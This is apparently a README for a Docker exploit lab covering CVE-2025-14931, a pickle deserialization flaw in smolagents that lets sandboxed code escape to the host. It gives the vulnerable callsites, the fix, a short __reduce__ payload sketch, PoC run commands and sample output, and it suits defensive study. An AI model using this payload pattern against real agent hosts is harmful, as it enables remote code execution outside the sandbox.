# CVE-2025-14931 - Hugging Face smolagents Unsafe Pickle Deserialization (Sandbox Escape RCE)

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-14931 |
| Component | [Hugging Face smolagents](https://github.com/huggingface/smolagents) |
| Type | CWE-502: Deserialization of Untrusted Data |
| CVSS | 10.0 (Critical) — `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| EPSS | 1.9% (82.9th percentile) |
| Affected | smolagents v1.10.0 through v1.24.0 |
| Fix | Commit [`41a3b005`](https://github.com/huggingface/smolagents/commit/41a3b005fadc6edd587a3ac6f6812987da405e26) (2026-02-15, no tagged release yet) |
| Author | Exploit Intelligence Platform |
| Date | 2025-12-23 |

## Vulnerability Details

smolagents versions 1.10.0 through 1.24.0 contain a critical unsafe deserialization vulnerability in the `RemotePythonExecutor` base class. All subclasses (`E2BExecutor`, `DockerExecutor`, `ModalExecutor`, `BlaxelExecutor`, `WasmExecutor`) use Python's `pickle.loads()` to deserialize data received from sandboxed remote execution environments without any validation. An attacker who can execute code inside a sandboxed container — or who can intercept/modify the communication channel — can craft a malicious pickle payload that achieves **arbitrary code execution on the host machine**, completely defeating the purpose of sandbox isolation.

The data flow is:
1. The host-side smolagents framework sends Python code to a remote sandboxed environment (Docker container, E2B sandbox, etc.) for execution.
2. When the remote code raises a `FinalAnswerException`, the result is serialized using `pickle.dumps()` + `base64.b64encode()` and transmitted back to the host via WebSocket, HTTP, or SDK API calls.
3. The host-side code calls `pickle.loads(base64.b64decode(...))` on the received data **without any validation or safety checks**.

Python's `pickle` module is inherently unsafe for untrusted data — it can execute arbitrary code during deserialization via the `__reduce__` protocol. The fundamental design flaw is trusting serialized data from an environment that is **explicitly designed to be untrusted** (sandboxed).

Three independent vulnerable callsites exist in `src/smolagents/remote_executors.py` (v1.24.0):

| Callsite | Line | Function | Affected Executors |
|----------|------|----------|--------------------|
| 1 | 194 | `E2BExecutor.run_code_raise_errors()` | E2BExecutor |
| 2 | 309 | `_websocket_run_code_raise_errors()` | DockerExecutor, ModalExecutor, BlaxelExecutor |
| 3 | 969 | `WasmExecutor.run_code_raise_errors()` | WasmExecutor |

### Attack Chain

```
Attacker controls sandbox/server
    │
    ▼
Crafts malicious pickle payload via __reduce__ protocol:
    class RCE:
        def __reduce__(self):
            return (os.system, ("ATTACKER_COMMAND",))
    payload = base64.b64encode(pickle.dumps(RCE())).decode()
    │
    ▼
Delivers payload as FinalAnswerException over WebSocket:
    {"msg_type": "error", "content": {
        "ename": "FinalAnswerException",
        "evalue": "<base64-encoded malicious pickle>"
    }}
    │
    ▼
smolagents host-side code (remote_executors.py:309):
    result = pickle.loads(base64.b64decode(evalue))
    │
    ▼
pickle __reduce__ protocol calls: os.system("ATTACKER_COMMAND")
    │
    ▼
ARBITRARY CODE EXECUTION ON HOST — sandbox escape complete
```

### Fix

The fix was introduced in commit [`41a3b005`](https://github.com/huggingface/smolagents/commit/41a3b005fadc6edd587a3ac6f6812987da405e26) (2026-02-15, PR [#1637](https://github.com/huggingface/smolagents/pull/1637)):

1. **New `SafeSerializer` class** — JSON-based serializer that handles common Python types without using `pickle`.
2. **All three `pickle.loads()` callsites replaced** with `_deserialize_final_answer()`, which uses prefix-based format detection and rejects pickle data when `allow_pickle=False`.
3. **Default secure configuration** — All executor constructors default to `allow_pickle=False`.

The combined fix (including follow-up commits `b4888920`, `bb2dab06`, `7f21b748`, `440e9192`) is complete. With `allow_pickle=False` (default), there is no code path that calls `pickle.loads()` on data from the remote executor.

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                      Docker Environment                          │
│                                                                  │
│  ┌──────────────────────────┐    ┌───────────────────────────┐  │
│  │  cve-2025-14931-         │    │  cve-2025-14931-victim    │  │
│  │  malicious-server        │    │                           │  │
│  │                          │    │  smolagents v1.24.0       │  │
│  │  Fake Jupyter Kernel GW  │◀───│  (vulnerable pickle.loads)│  │
│  │  (aiohttp, port 8888)    │    │                           │  │
│  │                          │    │  PoC scripts at /app/     │  │
│  └──────────────────────────┘    └───────────────────────────┘  │
│                │                            │                    │
│                └────────── lab-net ──────────┘                    │
└──────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-14931

# Build and start
docker compose build
docker compose up -d

# Run the exploit (inside the victim container)
docker exec cve-2025-14931-victim python3 /app/poc.py \
    --server-host cve-2025-14931-malicious-server --server-port 8888

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Description |
|---|---|---|---|
| `cve-2025-14931-malicious-server` | Attacker | `python:3.12-slim-bookworm` | Fake Jupyter Kernel Gateway serving crafted pickle payloads |
| `cve-2025-14931-victim` | Victim | `python:3.12-slim-bookworm` | smolagents v1.24.0 with vulnerable `pickle.loads()` code path |

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All scripts run inside the **victim container** via `docker exec`.

### Primary PoC (`poc/poc.py`) — WebSocket Exploit via Malicious Server

Exercises the full attack chain: connects to the malicious Jupyter Kernel Gateway, sends a code execution request over WebSocket, and triggers `pickle.loads()` on the server's malicious response.

```bash
docker exec cve-2025-14931-victim python3 /app/poc.py \
    --server-host cve-2025-14931-malicious-server --server-port 8888
```

### Expected Output (Vulnerable)

```
======================================================================
  CVE-2025-14931 — smolagents Pickle Deserialization RCE PoC
  Vulnerable: smolagents v1.10.0 – v1.24.0
  Target: _websocket_run_code_raise_errors() — line 309
  CWE-502 | CVSS 10.0 | Sandbox Escape via pickle.loads()
======================================================================

[1] Checking server readiness: GET http://...:8888/api/kernelspecs
    [+] Server is ready (HTTP 200)
[2] Creating kernel: POST http://...:8888/api/kernels
    [+] Kernel created: <kernel-id>
[3] Connecting WebSocket: ws://...:8888/api/kernels/<kernel-id>/channels
    [+] WebSocket connected
[4] Triggering _websocket_run_code_raise_errors() ...
    [+] Execution returned: output=0, is_final_answer=True
[5] Verifying RCE — checking for marker files on THIS host:
    [!!!] /tmp/pwned EXISTS — created by attacker payload!
    [!!!] /tmp/rce_proof.txt EXISTS — content: 'RCE_SUCCESS'

======================================================================
  RESULT: RCE CONFIRMED — CVE-2025-14931 successfully exploited!
======================================================================
```

### Vector 2: Direct Deserialization — All 3 Code Paths (`poc/poc_vector2.py`)

Demonstrates the root cause vulnerability without network interaction. Constructs the exact data structures each vulnerable code path processes and calls `pickle.loads()` with the same pattern, confirming all three independent callsites (lines 194, 309, 969).

```bash
docker exec cve-2025-14931-victim python3 /app/poc_vector2.py
```

### Vector 3: Self-Contained End-to-End Exploit (`poc/poc_vector3.py`)

A completely self-contained single-file exploit that starts its own malicious Jupyter Kernel Gateway server in a background thread, connects the vulnerable smolagents code to it, and achieves RCE — all without any external lab infrastructure.

```bash
docker exec cve-2025-14931-victim python3 /app/poc_vector3.py
```

## Verification

### Vulnerable Version (smolagents v1.24.0)

All three attack vectors confirmed on the vulnerable instance:

| Vector | Script | Code Path | Executor(s) | Result |
|--------|--------|-----------|-------------|--------|
| 1 (Primary) | `poc.py` | Line 309 (WebSocket) | DockerExecutor, ModalExecutor, BlaxelExecutor | **RCE CONFIRMED** |
| 2 (Direct) | `poc_vector2.py` | Lines 194, 309, 969 | ALL executors | **ALL 3 PATHS CONFIRMED** |
| 3 (Self-Contained) | `poc_vector3.py` | Line 309 (WebSocket) | DockerExecutor, ModalExecutor, BlaxelExecutor | **RCE CONFIRMED** |

**Evidence of exploitation:**
- Marker files (`/tmp/pwned`, `/tmp/rce_proof.txt`) created inside the victim container by attacker payload
- `os.system()` return code 0 confirms successful command execution
- Exploit triggers 100% reliably — no race condition, ASLR bypass, or memory corruption involved

### Patched Version (post-commit `41a3b005`)

The patched code uses `_deserialize_final_answer()` with `allow_pickle=False` (default). When the malicious server sends a pickle payload, it is rejected with a `ValueError: Received pickle data but allow_pickle=False`.

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — WebSocket exploit via malicious Jupyter Kernel Gateway |
| `poc/poc_vector2.py` | Vector 2 — direct pickle deserialization of all 3 code paths |
| `poc/poc_vector3.py` | Vector 3 — self-contained end-to-end exploit (no external server needed) |
| `malicious_server.py` | Fake Jupyter Kernel Gateway that delivers malicious pickle payloads |
| `trigger_exploit.py` | Minimal trigger script for quick verification |
| `Dockerfile.malicious-server` | Builds the malicious server container |
| `Dockerfile.victim` | Builds the victim container with smolagents v1.24.0 |
| `docker-compose.yml` | Lab orchestration for both containers |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Verification test results for all 3 vectors |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-14931)
- [ZDI Advisory (ZDI-25-1143)](https://www.zerodayinitiative.com/advisories/ZDI-25-1143/)
- [GitHub Advisory (GHSA-q9r5-6hrr-9ph7)](https://github.com/advisories/GHSA-q9r5-6hrr-9ph7)
- [smolagents Repository](https://github.com/huggingface/smolagents)
- [Fix PR (#1637)](https://github.com/huggingface/smolagents/pull/1637)
- [Fix Commit](https://github.com/huggingface/smolagents/commit/41a3b005fadc6edd587a3ac6f6812987da405e26)

## Timeline

| Date | Event |
|---|---|
| 2025-12-18 | ZDI publishes advisory ZDI-25-1143 as a 0-day (vendor had rejected/closed the report) |
| 2025-12-23 | CVE-2025-14931 published in NVD |
| 2026-01-16 | smolagents v1.24.0 released (still vulnerable) |
| 2026-02-15 | Fix committed to main branch (commit `41a3b005`, PR #1637) |
| 2026-02-21 | Legacy no-prefix pickle support removed entirely |
| — | No tagged release with the fix yet |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-14931 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
